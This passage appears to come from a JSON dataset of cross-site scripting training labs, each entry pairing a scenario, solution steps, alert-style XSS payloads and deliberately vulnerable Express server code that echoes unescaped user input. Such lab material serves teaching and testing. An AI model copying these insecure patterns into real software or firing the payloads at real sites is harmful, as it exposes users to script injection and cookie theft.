        "<script>alert('Calc XSS')</script>",
        "<img src=x onerror=alert('Calc XSS')>",
        "<svg/onload=alert('Calc XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/calculator', (req, res) => {\n  const expression = req.query.expr;\n  res.send(`<html><body><h2>Result:</h2><div>${expression}</div></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Online Ticket Booking Summary",
      "Lab Description": "A travel site reflects ticket details from the query string into the booking summary using innerHTML without sanitization, exposing a reflected XSS vector.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the summary page with a malicious `name` parameter.",
        "Observe script execution when the page renders the booking summary."
      ],
      "payloads": [
        "<script>alert('Booking XSS')</script>",
        "<img src=x onerror=alert('Booking XSS')>",
        "<svg/onload=alert('Booking XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/booking-summary', (req, res) => {\n  const name = req.query.name;\n  res.send(`<html><body><h1>Your Booking</h1><p>Passenger: ${name}</p></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Team Collaboration Notes",
      "Lab Description": "A collaboration app lets team members add notes to shared boards. Notes are stored and rendered using raw HTML without escaping, enabling persistent XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a note with a script tag.",
        "View the shared board as another user and observe script execution."
      ],
      "payloads": [
        "<script>alert('Note XSS')</script>",
        "<img src=x onerror=alert('Note XSS')>",
        "<svg/onload=alert('Note XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet notes = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/add-note', (req, res) => {\n  notes.push(req.body.content);\n  res.redirect('/board');\n});\napp.get('/board', (req, res) => {\n  let html = '<html><body><h2>Team Board</h2>';\n  notes.forEach(n => { html += `<div>${n}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM-based XSS in Forum Topic Preview",
      "Lab Description": "A forum allows previewing a topic by parsing the `#preview` hash and inserting it via innerHTML. JavaScript in the hash executes due to no sanitization.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft a URL with a malicious `#preview` fragment.",
        "Visit the preview page and observe XSS triggered from the DOM."
      ],
      "payloads": [
        "<script>alert('Preview XSS')</script>",
        "<img src=x onerror=alert('Preview XSS')>",
        "<svg/onload=alert('Preview XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/preview-topic', (req, res) => {\n  res.send(`<html><body><h1>Preview</h1><div id='content'></div><script>document.getElementById('content').innerHTML = location.hash.slice(1);</script></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in E-commerce Discount Preview",
      "Lab Description": "A discount preview feature reflects the coupon code from the query string into a message without sanitization. JavaScript payloads in the parameter result in XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the preview page with a malicious `code` parameter.",
        "Observe the reflected value rendering unescaped and executing."
      ],
      "payloads": [
        "<script>alert('Discount XSS')</script>",
        "<img src=x onerror=alert('Discount XSS')>",
        "<svg/onload=alert('Discount XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/discount-preview', (req, res) => {\n  const code = req.query.code;\n  res.send(`<html><body><h1>Your Discount</h1><p>${code}</p></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Custom Badge Generator",
      "Lab Description": "Users can create custom badges with titles. These titles are stored and rendered across the platform using innerHTML, allowing XSS if script tags are submitted.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a badge title with JavaScript payload.",
        "Browse the badge listing page and confirm XSS execution."
      ],
      "payloads": [
        "<script>alert('Badge XSS')</script>",
        "<img src=x onerror=alert('Badge XSS')>",
        "<svg/onload=alert('Badge XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet badges = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/create-badge', (req, res) => {\n  badges.push(req.body.title);\n  res.redirect('/badges');\n});\napp.get('/badges', (req, res) => {\n  let html = '<html><body><h1>Custom Badges</h1>';\n  badges.forEach(b => { html += `<div>${b}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Payment Gateway Redirect URL",
      "Lab Description": "An e-commerce site integrates a third-party payment gateway that redirects users back to a user-specified return URL after payment. The application reflects the `returnUrl` parameter on the payment status page without proper encoding, making it vulnerable to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to the checkout page and proceed to payment.",
        "Intercept the redirect URL and modify the `returnUrl` to contain a script payload.",
        "Observe the final payment status page reflecting the script from the returnUrl."
      ],
      "payloads": [
        "<script>alert('XSS Payment')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/payment-status', (req, res) => { const returnUrl = req.query.returnUrl || '/'; res.send(`<html><body><h2>Payment Status</h2><p>Redirecting to: ${returnUrl}</p></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Dynamic Modal Dialog",
      "Lab Description": "A blog platform dynamically creates modal dialogs using data from query parameters for showing user-submitted alerts. The `message` parameter is inserted directly into the modal content without sanitization, allowing XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to the modal alert page with a `message` parameter in the URL.",
        "Inject JavaScript code in the parameter and confirm execution in the modal."
      ],
      "payloads": [
        "<script>alert('XSS Modal')</script>",
        "<div onmouseover=alert('XSS')>Hover me</div>",
        "<img src=x onerror=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/modal', (req, res) => { const message = req.query.message || 'No message'; res.send(`<html><body><div id='modal'>${message}</div></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Notification Popups",
      "Lab Description": "The application retrieves notifications from user profiles and inserts them directly into DOM via innerHTML to display popups. The notification content is not sanitized server-side, leading to a stored XSS vulnerability.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Login and post a notification message containing a payload.",
        "Switch to another user account and trigger the popup display.",
        "Observe script execution from stored content."
      ],
      "payloads": [
        "<script>alert('XSS Notify')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; let notifications = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/submit', (req, res) => { res.send(`<form method='POST'><input name='msg'><button type='submit'>Send</button></form>`); }); app.post('/submit', (req, res) => { notifications.push(req.body.msg); res.redirect('/notifications'); }); app.get('/notifications', (req, res) => { const notifHTML = notifications.map(n => `<div>${n}</div>`).join(''); res.send(`<html><body>${notifHTML}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Survey Preview Feature",
      "Lab Description": "The survey builder feature allows users to preview their questions before submission. The preview uses unescaped question text provided in a query string parameter, which is directly embedded in the preview page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the survey builder preview page with a malicious question input.",
        "Insert a payload via the URL and observe script execution on the preview."
      ],
      "payloads": [
        "<script>alert('Survey XSS')</script>",
        "<svg/onload=alert('Survey')>",
        "<iframe src='javascript:alert(`XSS`)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/survey-preview', (req, res) => { const q = req.query.q || 'No question'; res.send(`<html><body><h3>Preview:</h3><p>${q}</p></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS via Document Title in Analytics Dashboard",
      "Lab Description": "An analytics dashboard generates a custom report title from user input and reflects it in the document title. The title is inserted using template literals in a script block, allowing DOM-based XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a custom title with a script payload.",
        "Observe the title being reflected unsafely in a JavaScript block on the dashboard.",
        "Trigger the payload and confirm execution."
      ],
      "payloads": [
        "`;alert('XSS')//",
        "';alert(1);//",
        "\";alert(1);//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/dashboard', (req, res) => { const title = req.query.title || 'Report'; res.send('<html><head><script>document.title = \"' + title + '\";</script></head><body><h1>Dashboard</h1></body></html>'); }); app.listen(port);"
    },
    {
      "Lab scenario": "Reflected XSS in Email Invitation Preview",
      "Lab Description": "An internal tool allows team members to preview email invitations before sending. The email message is reflected directly from the `message` query parameter into the email body preview page without encoding.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the invitation preview page with a custom `message` parameter.",
        "Inject an XSS payload in the `message` parameter.",
        "Observe the payload execution within the preview."
      ],
      "payloads": [
        "<script>alert('Email XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/preview-invite', (req, res) => { const message = req.query.message || 'Join our team!'; res.send(`<html><body><h3>Invitation Preview</h3><div>${message}</div></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Job Application Confirmation Page",
      "Lab Description": "After submitting a job application, users are redirected to a confirmation page that shows their submitted name. The name is reflected into the DOM without sanitization.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Go to the job application form and submit a name containing an XSS payload.",
        "Observe the reflected confirmation page executing the script."
      ],
      "payloads": [
        "<script>alert('XSS Confirm')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<div onmouseover=alert(1)>Hover me</div>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const port = 3000; app.get('/apply', (req, res) => { res.send(`<form method='POST'><input name='fullname'><button type='submit'>Apply</button></form>`); }); app.post('/apply', (req, res) => { const name = req.body.fullname || 'Anonymous'; res.send(`<html><body><h2>Thank you ${name} for applying!</h2></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "Stored XSS in Forum Signature",
      "Lab Description": "A discussion forum allows users to set custom signatures. These signatures are displayed under every post without being sanitized, making it a vector for stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Update the profile signature with a JavaScript payload.",
        "Create or reply to a post to trigger the signature rendering.",
        "View the post and observe script execution from the stored signature."
      ],
      "payloads": [
        "<script>alert('Forum XSS')</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const port = 3000; let userSignature = ''; app.get('/profile', (req, res) => { res.send(`<form method='POST'><input name='sig'><button type='submit'>Update Signature</button></form>`); }); app.post('/profile', (req, res) => { userSignature = req.body.sig; res.redirect('/post'); }); app.get('/post', (req, res) => { res.send(`<html><body><p>User post content</p><div>${userSignature}</div></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "DOM XSS via Fragment Identifier Injection",
      "Lab Description": "A client-side script reads the URL fragment (`window.location.hash`) and writes it directly to the DOM to display a section title. No sanitization is performed.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the vulnerable page with a payload in the URL fragment (after #).",
        "Observe that the script injects the fragment content into the page DOM.",
        "Payload execution confirms DOM XSS."
      ],
      "payloads": [
        "#<script>alert('DOM XSS')</script>",
        "#<img src=x onerror=alert(1)>",
        "#<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/', (req, res) => { res.send(`<html><body><h1>Fragment Demo</h1><div id='section'></div><script>document.getElementById('section').innerHTML = window.location.hash.substring(1);</script></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Help Center Feedback Box",
      "Lab Description": "A help center page allows users to submit feedback. Submitted messages are displayed to admins without proper encoding, allowing a stored XSS attack via the feedback box.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit feedback with a malicious payload.",
        "Login as admin and visit the feedback dashboard.",
        "Observe the XSS payload execution."
      ],
      "payloads": [
        "<script>alert('Feedback XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const port = 3000; const feedbacks = []; app.get('/feedback', (req, res) => { res.send(`<form method='POST'><textarea name='fb'></textarea><button type='submit'>Submit</button></form>`); }); app.post('/feedback', (req, res) => { feedbacks.push(req.body.fb); res.redirect('/admin'); }); app.get('/admin', (req, res) => { const fbHTML = feedbacks.map(fb => `<div>${fb}</div>`).join(''); res.send(`<html><body><h2>Feedback</h2>${fbHTML}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Bug Tracker Ticket Title",
      "Lab Description": "A bug tracking system displays ticket titles in the admin dashboard without sanitizing user input. Attackers can exploit this by creating a ticket with an XSS payload as the title.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a new ticket with a malicious script in the title field.",
        "Login as admin and view the ticket dashboard.",
        "The XSS payload is executed in the admin context."
      ],
      "payloads": [
        "<script>alert('Bug XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const tickets = []; app.get('/submit-ticket', (req, res) => { res.send(`<form method='POST'><input name='title'><button type='submit'>Submit Ticket</button></form>`); }); app.post('/submit-ticket', (req, res) => { tickets.push(req.body.title); res.redirect('/admin-tickets'); }); app.get('/admin-tickets', (req, res) => { const list = tickets.map(t => `<li>${t}</li>`).join(''); res.send(`<ul>${list}</ul>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in File Sharing Platform Filename",
      "Lab Description": "A file sharing platform shows uploaded filenames in a list. Filenames containing scripts are rendered directly into the page without sanitization, leading to stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Upload a file with a malicious name containing an XSS payload.",
        "Visit the shared file listing page.",
        "Payload gets executed when the filename is rendered."
      ],
      "payloads": [
        "<script>alert('File XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<video><source onerror=alert('XSS')></video>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const files = []; app.get('/upload', (req, res) => { res.send(`<form method='POST'><input name='filename'><button type='submit'>Upload</button></form>`); }); app.post('/upload', (req, res) => { files.push(req.body.filename); res.redirect('/files'); }); app.get('/files', (req, res) => { const list = files.map(f => `<li>${f}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Blog Comment Timestamp Field",
      "Lab Description": "A blogging platform allows users to specify the time of their comment. The timestamp is rendered directly into the HTML without encoding, which allows for a reflected XSS attack.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a comment with a malicious script as the timestamp.",
        "The script is reflected and executed when viewing the blog post."
      ],
      "payloads": [
        "<script>alert('Timestamp XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const comments = []; app.get('/post', (req, res) => { res.send(`<form method='POST'><input name='text'><input name='time'><button type='submit'>Comment</button></form>`); }); app.post('/post', (req, res) => { comments.push({ text: req.body.text, time: req.body.time }); res.redirect('/view-post'); }); app.get('/view-post', (req, res) => { const list = comments.map(c => `<p>${c.text} at ${c.time}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "DOM XSS in Search Filter Category",
      "Lab Description": "An e-commerce site uses JavaScript to display the selected category from the URL hash (e.g., `#category=shoes`). The value is injected directly into the DOM without sanitization.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Craft a URL with a malicious category value in the hash.",
        "When visited, the payload is inserted into the DOM and executed."
      ],
      "payloads": [
        "#category=<script>alert('DOM Category')</script>",
        "#category=<img src=x onerror=alert(1)>",
        "#category=<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/', (req, res) => { res.send(`<html><body><div id='cat'></div><script>const cat = location.hash.split('=')[1]; document.getElementById('cat').innerHTML = cat;</script></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Newsletter Subscription Response",
      "Lab Description": "A newsletter subscription endpoint reflects the user's email in the response message. This reflection is done insecurely, allowing attackers to inject scripts via the email field.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit a subscription form with a script as the email.",
        "Observe the confirmation message executing the payload."
      ],
      "payloads": [
        "<script>alert('Newsletter XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); app.get('/subscribe', (req, res) => { res.send(`<form method='POST'><input name='email'><button type='submit'>Subscribe</button></form>`); }); app.post('/subscribe', (req, res) => { const email = req.body.email; res.send(`<html><body>Thanks for subscribing, ${email}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Help Desk Ticket Notes",
      "Lab Description": "A help desk application allows support agents to add notes to user tickets. These notes are rendered in the admin panel without sanitization, leading to stored XSS when a malicious note is added.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Login as a support agent.",
        "Submit a ticket note containing an XSS payload.",
        "When the admin views the ticket, the payload executes."
      ],
      "payloads": [
        "<script>alert('HelpDeskXSS')</script>",
        "<img src=x onerror=alert(1337)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const notes = []; app.get('/add-note', (req, res) => { res.send(`<form method='POST'><textarea name='note'></textarea><button type='submit'>Submit</button></form>`); }); app.post('/add-note', (req, res) => { notes.push(req.body.note); res.redirect('/admin-panel'); }); app.get('/admin-panel', (req, res) => { const allNotes = notes.map(n => `<div>${n}</div>`).join(''); res.send(`<html><body>${allNotes}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "Reflected XSS in Job Application Search",
      "Lab Description": "A job portal allows searching applicants using a keyword in the query string. The search term is reflected back into the page without proper escaping, making it vulnerable to reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Craft a URL with a malicious script in the search query.",
        "Visit the search results page to trigger the payload."
      ],
      "payloads": [
        "?search=<script>alert('SearchXSS')</script>",
        "?search=<img src=x onerror=alert(1)>",
        "?search=<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/search', (req, res) => { const query = req.query.search || ''; res.send(`<html><body>Results for: ${query}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Community Event Organizer Location Input",
      "Lab Description": "A community platform lets organizers create events and input the event location. The location is displayed on the event page without sanitization, leading to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create an event with a location containing an XSS payload.",
        "Visit the event page where the payload is displayed.",
        "The script executes when the location is rendered."
      ],
      "payloads": [
        "<script>alert('LocationXSS')</script>",
        "<img src=x onerror=alert('Event')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const events = []; app.get('/create-event', (req, res) => { res.send(`<form method='POST'><input name='name'><input name='location'><button type='submit'>Create</button></form>`); }); app.post('/create-event', (req, res) => { events.push({ name: req.body.name, location: req.body.location }); res.redirect('/events'); }); app.get('/events', (req, res) => { const list = events.map(e => `<h2>${e.name}</h2><p>${e.location}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Banking Support Chat Transcript Viewer",
      "Lab Description": "Banking admins can view past support chat transcripts. If a malicious user injects a script into a chat message, it is displayed in the admin panel without sanitization.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a message with an XSS payload in the support chat.",
        "When the admin reviews the transcript, the payload executes."
      ],
      "payloads": [
        "<script>alert('BankXSS')</script>",
        "<img src=x onerror=alert('Chat')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const chats = []; app.get('/support', (req, res) => { res.send(`<form method='POST'><input name='msg'><button type='submit'>Send</button></form>`); }); app.post('/support', (req, res) => { chats.push(req.body.msg); res.redirect('/admin-chat'); }); app.get('/admin-chat', (req, res) => { const chatLog = chats.map(c => `<div>${c}</div>`).join(''); res.send(`<html><body>${chatLog}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Real Estate Listing Description",
      "Lab Description": "A real estate portal allows sellers to add property listings with descriptions. Malicious users can inject scripts into the description, which are executed when viewed by others.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a listing with a malicious description.",
        "View the listing detail page to trigger the XSS."
      ],
      "payloads": [
        "<script>alert('ListingXSS')</script>",
        "<img src=x onerror=alert('Desc')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const listings = []; app.get('/new-listing', (req, res) => { res.send(`<form method='POST'><input name='title'><textarea name='desc'></textarea><button type='submit'>Post</button></form>`); }); app.post('/new-listing', (req, res) => { listings.push({ title: req.body.title, desc: req.body.desc }); res.redirect('/listings'); }); app.get('/listings', (req, res) => { const rendered = listings.map(l => `<h3>${l.title}</h3><p>${l.desc}</p>`).join(''); res.send(`<html><body>${rendered}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Social Media Hashtag Search",
      "Lab Description": "A social media platform allows users to search for hashtags. The searched term is directly reflected in the page content without sanitization, making it vulnerable to reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to the hashtag search page with a malicious query string.",
        "The XSS payload is reflected and executed."
      ],
      "payloads": [
        "?tag=<script>alert('Hashtag')</script>",
        "?tag=<img src=x onerror=alert('XSS')>",
        "?tag=<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/search-tag', (req, res) => { const tag = req.query.tag || ''; res.send(`<html><body>Showing results for: ${tag}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "Stored XSS in Product Inventory Notes",
      "Lab Description": "Warehouse staff can leave notes on products. These notes are shown on the inventory dashboard, which renders unsanitized HTML, leading to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add a note with XSS content to a product.",
        "Access the inventory dashboard to trigger the XSS."
      ],
      "payloads": [
        "<script>alert('Inventory')</script>",
        "<img src=x onerror=alert('Note')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const inventory = []; app.get('/add-note', (req, res) => { res.send(`<form method='POST'><input name='item'><textarea name='note'></textarea><button type='submit'>Add</button></form>`); }); app.post('/add-note', (req, res) => { inventory.push({ item: req.body.item, note: req.body.note }); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { const list = inventory.map(i => `<h4>${i.item}</h4><p>${i.note}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Developer Forum Signature",
      "Lab Description": "Developers can add signatures to their forum profile. These signatures are shown in each post and are rendered as HTML without sanitization, introducing stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Edit your signature with a malicious payload.",
        "Post a message in the forum.",
        "Anyone viewing the post sees the XSS executed."
      ],
      "payloads": [
        "<script>alert('Signature')</script>",
        "<img src=x onerror=alert('Forum')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); let signature = ''; const posts = []; app.get('/set-signature', (req, res) => { res.send(`<form method='POST'><textarea name='sig'></textarea><button type='submit'>Set</button></form>`); }); app.post('/set-signature', (req, res) => { signature = req.body.sig; res.redirect('/forum'); }); app.get('/post', (req, res) => { res.send(`<form method='POST'><input name='content'><button type='submit'>Post</button></form>`); }); app.post('/post', (req, res) => { posts.push(req.body.content); res.redirect('/forum'); }); app.get('/forum', (req, res) => { const html = posts.map(p => `<div>${p}<footer>${signature}</footer></div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "Stored XSS in Real-Time Auction Comments",
      "Lab Description": "Users can comment on live auction items. These comments are stored and displayed on the bidding page without any sanitization, allowing persistent XSS attacks.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Post a comment with XSS on an auction item.",
        "Open the auction page to see the comment executed."
      ],
      "payloads": [
        "<script>alert('Auction')</script>",
        "<img src=x onerror=alert('Bid')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const comments = []; app.get('/auction-comment', (req, res) => { res.send(`<form method='POST'><textarea name='comment'></textarea><button type='submit'>Submit</button></form>`); }); app.post('/auction-comment', (req, res) => { comments.push(req.body.comment); res.redirect('/live-auction'); }); app.get('/live-auction', (req, res) => { const rendered = comments.map(c => `<p>${c}</p>`).join(''); res.send(`<html><body>${rendered}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Academic Portal Feedback Form",
      "Lab Description": "A university feedback form allows students to submit anonymous reviews. These reviews are shown to lecturers in their dashboard without proper escaping.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit feedback containing a JavaScript payload.",
        "Lecturer logs in to their dashboard and sees the review.",
        "The script is executed in the lecturer's browser."
      ],
      "payloads": [
        "<script>alert('Feedback')</script>",
        "<img src=x onerror=alert('Prof')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: true })); const feedbacks = []; app.get('/feedback', (req, res) => { res.send(`<form method='POST'><textarea name='review'></textarea><button type='submit'>Submit</button></form>`); }); app.post('/feedback', (req, res) => { feedbacks.push(req.body.review); res.redirect('/lecturer'); }); app.get('/lecturer', (req, res) => { const html = feedbacks.map(f => `<blockquote>${f}</blockquote>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in Recently Viewed Items Feature",
      "Lab Description": "The application shows a list of recently viewed items using local storage values. These values are injected directly into the DOM on page load without proper sanitization, allowing DOM-based XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Open the browser console and inject a malicious item into localStorage.",
        "Refresh the page and observe the stored item being inserted into the DOM without sanitization.",
        "Verify JavaScript execution from localStorage."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<script>alert('XSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const port = 3000; app.get('/', (req, res) => { res.send(`<html><head><title>Shop</title></head><body><h1>Recently Viewed</h1><ul id='recent'></ul><script>const items = JSON.parse(localStorage.getItem('recent') || '[]');items.forEach(item => {document.getElementById('recent').innerHTML += '<li>' + item + '</li>';});</script></body></html>`); }); app.listen(port);"
    },
    {
      "Lab scenario": "XSS in User Bio Tooltip Feature",
      "Lab Description": "User bios are displayed as tooltips when hovering over usernames. The bios are rendered using the title attribute directly from unescaped user input, enabling stored XSS via malicious bios.",
      "Difficulty Level": "High",
      "Solution Steps": [
        "Register or modify a user with a bio that includes an XSS payload.",
        "Hover over the username on the profile list page.",
        "Observe the execution of JavaScript in the tooltip."
      ],
      "payloads": [
        "\"><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert('XSS')>"
      ],
